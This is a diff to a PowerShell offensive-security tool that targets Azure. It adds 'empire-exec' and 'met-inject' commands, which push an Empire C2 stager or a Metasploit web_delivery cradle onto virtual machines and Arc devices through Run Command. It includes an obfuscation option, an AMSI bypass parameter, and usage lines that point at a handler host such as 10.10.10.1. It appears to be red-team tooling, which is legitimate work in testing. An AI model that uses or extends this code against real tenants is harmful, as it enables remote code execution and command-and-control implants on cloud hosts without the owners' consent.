@@ -745,7 +745,7 @@
 [CmdletBinding()]
 param(
     [Parameter(Mandatory = $true, Position = 0)]
-    [ValidateSet("hosts", "tenant", "users", "user-profiles", "rid-brute", "groups", "pass-pol", "guest", "spray", "vuln-list", "sessions", "guest-vuln-scan", "apps", "sp-discovery", "roles", "ca-policies", "vm-loggedon", "storage-enum", "keyvault-enum", "network-enum", "shares-enum", "disks-enum", "bitlocker-enum", "local-groups", "av-enum", "process-enum", "lockscreen-enum", "intune-enum", "delegation-enum", "exec", "help")]
+    [ValidateSet("hosts", "tenant", "users", "user-profiles", "rid-brute", "groups", "pass-pol", "guest", "spray", "vuln-list", "sessions", "guest-vuln-scan", "apps", "sp-discovery", "roles", "ca-policies", "vm-loggedon", "storage-enum", "keyvault-enum", "network-enum", "shares-enum", "disks-enum", "bitlocker-enum", "local-groups", "av-enum", "process-enum", "lockscreen-enum", "intune-enum", "delegation-enum", "exec", "empire-exec", "met-inject", "help")]
     [string]$Command,
     
     [Parameter(Mandatory = $false)]
@@ -861,7 +861,49 @@ param(
     [int]$PID,                     # Target process ID for token duplication
 
     [Parameter(Mandatory = $false)]
-    [string]$TargetUser            # Target user to impersonate (finds their process automatically)
+    [string]$TargetUser,            # Target user to impersonate (finds their process automatically)
+
+    # Empire execution options (empire-exec command - NetExec -M empire_exec equivalent)
+    [Parameter(Mandatory = $false)]
+    [string]$Listener,             # Empire listener name
+
+    [Parameter(Mandatory = $false)]
+    [string]$EmpireHost,           # Empire server hostname/IP
+
+    [Parameter(Mandatory = $false)]
+    [int]$EmpirePort = 1337,       # Empire API port
+
+    [Parameter(Mandatory = $false)]
+    [string]$EmpireUsername,       # Empire API username
+
+    [Parameter(Mandatory = $false)]
+    [string]$EmpirePassword,       # Empire API password
+
+    [Parameter(Mandatory = $false)]
+    [string]$EmpireConfigFile,     # Path to Empire config file (JSON)
+
+    [Parameter(Mandatory = $false)]
+    [switch]$Obfuscate,            # Enable stager obfuscation
+
+    [Parameter(Mandatory = $false)]
+    [string]$ObfuscateCommand,     # Obfuscation options (default: Token,All,1)
+
+    # Metasploit injection options (met-inject command - NetExec -M met_inject equivalent)
+    [Parameter(Mandatory = $false)]
+    [string]$SRVHOST,              # Metasploit handler host
+
+    [Parameter(Mandatory = $false)]
+    [int]$SRVPORT,                 # Metasploit handler port
+
+    [Parameter(Mandatory = $false)]
+    [string]$RAND,                 # Random URI path for payload
+
+    # Note: $SSL switch already exists for guest command, reused for empire/met SSL
+    [Parameter(Mandatory = $false)]
+    [string]$ProxyHost,            # Proxy host for met_inject
+
+    [Parameter(Mandatory = $false)]
+    [int]$ProxyPort                # Proxy port for met_inject
 )
 
 
@@ -893,6 +935,7 @@ $FunctionsPath = Join-Path $PSScriptRoot "Functions"
 . "$FunctionsPath\Intune.ps1"
 . "$FunctionsPath\Delegation.ps1"
 . "$FunctionsPath\CommandExecution.ps1"
+. "$FunctionsPath\ShellGeneration.ps1"
 
 # ============================================
 # MAIN EXECUTION
@@ -1003,7 +1046,7 @@ if ($Command -eq "av-enum") {
 }
 
 # ARM-based commands use Azure Resource Manager (Az modules) with RBAC, not Graph API
-if ($Command -in @("vm-loggedon", "storage-enum", "keyvault-enum", "network-enum", "shares-enum", "disks-enum", "bitlocker-enum", "process-enum", "lockscreen-enum", "exec")) {
+if ($Command -in @("vm-loggedon", "storage-enum", "keyvault-enum", "network-enum", "shares-enum", "disks-enum", "bitlocker-enum", "process-enum", "lockscreen-enum", "exec", "empire-exec", "met-inject")) {
     Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
     Write-ColorOutput -Message "[*] AZURE RESOURCE MANAGER - RBAC REQUIREMENTS" -Color "Cyan"
     Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
@@ -1084,6 +1127,24 @@ if ($Command -in @("vm-loggedon", "storage-enum", "keyvault-enum", "network-enum
             Write-ColorOutput -Message "      • DeviceManagementManagedDevices.PrivilegedOperations.All`n" -Color "Gray"
             Write-ColorOutput -Message "    Azure Automation (automation):" -Color "White"
             Write-ColorOutput -Message "      • Automation Contributor role`n" -Color "Gray"
+        }
+        "empire-exec" {
+            Write-ColorOutput -Message "[*] Required Azure RBAC Roles for Empire Execution:`n" -Color "Yellow"
+            Write-ColorOutput -Message "    Same as 'exec' command - deploys Empire stager via Azure execution methods" -Color "White"
+            Write-ColorOutput -Message "    VM Run Command: Reader + Virtual Machine Command Executor" -Color "Gray"
+            Write-ColorOutput -Message "    Arc Run Command: Azure Connected Machine Resource Administrator`n" -Color "Gray"
+            Write-ColorOutput -Message "    Additional Requirements:" -Color "White"
+            Write-ColorOutput -Message "      • Empire C2 server running with REST API enabled" -Color "Gray"
+            Write-ColorOutput -Message "      • Valid Empire listener configured`n" -Color "Gray"
+        }
+        "met-inject" {
+            Write-ColorOutput -Message "[*] Required Azure RBAC Roles for Metasploit Injection:`n" -Color "Yellow"
+            Write-ColorOutput -Message "    Same as 'exec' command - deploys Metasploit cradle via Azure execution methods" -Color "White"
+            Write-ColorOutput -Message "    VM Run Command: Reader + Virtual Machine Command Executor" -Color "Gray"
+            Write-ColorOutput -Message "    Arc Run Command: Azure Connected Machine Resource Administrator`n" -Color "Gray"
+            Write-ColorOutput -Message "    Additional Requirements:" -Color "White"
+            Write-ColorOutput -Message "      • Metasploit handler running (exploit/multi/script/web_delivery)" -Color "Gray"
+            Write-ColorOutput -Message "      • Network connectivity from target to handler`n" -Color "Gray"
         }
     }
     
@@ -1205,12 +1266,46 @@ switch ($Command) {
             -AmsiBypass $AmsiBypass `
             -PID $PID -TargetUser $TargetUser
     }
+    "empire-exec" {
+        # Validate empire-exec command has required parameter
+        if (-not $Listener) {
+            Write-ColorOutput -Message "[!] Error: -Listener parameter is required for empire-exec command" -Color "Red"
+            Write-ColorOutput -Message "[*] Usage: .\azx.ps1 empire-exec -Listener 'http' -EmpireHost 'empire.com' -VMName 'vm-name'" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 empire-exec -Listener 'http' -EmpireConfigFile 'config.json' -AllVMs" -Color "Yellow"
+            return
+        }
+        $obfuscateCmd = if ($ObfuscateCommand) { $ObfuscateCommand } else { "Token,All,1" }
+        Invoke-EmpireExecution -Listener $Listener `
+            -EmpireHost $EmpireHost -EmpirePort $EmpirePort `
+            -EmpireUsername $EmpireUsername -EmpirePassword $EmpirePassword `
+            -SSL:$SSL -Obfuscate:$Obfuscate -ObfuscateCommand $obfuscateCmd `
+            -EmpireConfigFile $EmpireConfigFile `
+            -VMName $VMName -AllVMs:$AllVMs -DeviceName $DeviceName -AllDevices:$AllDevices `
+            -ResourceGroup $ResourceGroup -SubscriptionId $SubscriptionId `
+            -ExecMethod $ExecMethod -Timeout $Timeout -AmsiBypass $AmsiBypass `
+            -ExportPath $ExportPath
+    }
+    "met-inject" {
+        # Validate met-inject command has required parameters
+        if (-not $SRVHOST -or -not $SRVPORT -or -not $RAND) {
+            Write-ColorOutput -Message "[!] Error: -SRVHOST, -SRVPORT, and -RAND parameters are required for met-inject command" -Color "Red"
+            Write-ColorOutput -Message "[*] Usage: .\azx.ps1 met-inject -SRVHOST '10.10.10.1' -SRVPORT 8080 -RAND 'abc123' -VMName 'vm-name'" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 met-inject -SRVHOST '10.10.10.1' -SRVPORT 8080 -RAND 'abc123' -AllVMs -SSL" -Color "Yellow"
+            return
+        }
+        Invoke-MetasploitInjection -SRVHOST $SRVHOST -SRVPORT $SRVPORT -RAND $RAND `
+            -SSL:$SSL -ProxyHost $ProxyHost -ProxyPort $ProxyPort `
+            -VMName $VMName -AllVMs:$AllVMs -DeviceName $DeviceName -AllDevices:$AllDevices `
+            -ResourceGroup $ResourceGroup -SubscriptionId $SubscriptionId `
+            -ExecMethod $ExecMethod -Timeout $Timeout -AmsiBypass $AmsiBypass `
+            -ExportPath $ExportPath
+    }
     "help" {
         Show-Help
     }
     default {
         Write-ColorOutput -Message "[!] Unknown command: $Command" -Color "Red"
-        Write-ColorOutput -Message "[*] Available commands: hosts, tenant, users, user-profiles, rid-brute, groups, pass-pol, guest, spray, vuln-list, sessions, guest-vuln-scan, apps, sp-discovery, roles, ca-policies, vm-loggedon, storage-enum, keyvault-enum, network-enum, shares-enum, disks-enum, bitlocker-enum, local-groups, av-enum, process-enum, lockscreen-enum, intune-enum, delegation-enum, exec, help" -Color "Yellow"
+        Write-ColorOutput -Message "[*] Available commands: hosts, tenant, users, user-profiles, rid-brute, groups, pass-pol, guest, spray, vuln-list, sessions, guest-vuln-scan, apps, sp-discovery, roles, ca-policies, vm-loggedon, storage-enum, keyvault-enum, network-enum, shares-enum, disks-enum, bitlocker-enum, local-groups, av-enum, process-enum, lockscreen-enum, intune-enum, delegation-enum, exec, empire-exec, met-inject, help" -Color "Yellow"
     }
 }
 
